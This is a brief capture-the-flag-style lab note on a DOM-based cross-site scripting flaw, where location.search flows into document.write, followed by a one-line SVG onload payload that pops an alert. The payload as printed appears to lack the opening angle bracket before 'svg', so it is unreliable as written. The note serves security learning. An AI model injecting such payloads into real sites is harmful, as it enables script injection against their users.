# DOM XSS in document.write sink using source location.search - svg tag

In source code we found:

- window.location.search -> source
- document.write -> sink

![Screenshot1](/04-Screenshots/dom-svg1.png)

Payload:

```html
">svg onload=alert(1)>
```